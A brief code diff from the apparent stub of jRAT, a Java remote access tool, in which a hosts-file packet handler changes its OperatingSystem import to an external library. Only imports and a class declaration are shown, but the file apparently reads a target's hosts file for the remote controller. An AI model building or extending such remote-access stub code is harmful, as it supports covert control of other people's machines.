@@ -5,9 +5,10 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.InputStreamReader;
 
-import se.jrat.common.OperatingSystem;
 import se.jrat.stub.Connection;
 import se.jrat.stub.packets.outgoing.Packet38HostFile;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 public class Packet55HostsFile extends AbstractIncomingPacket {
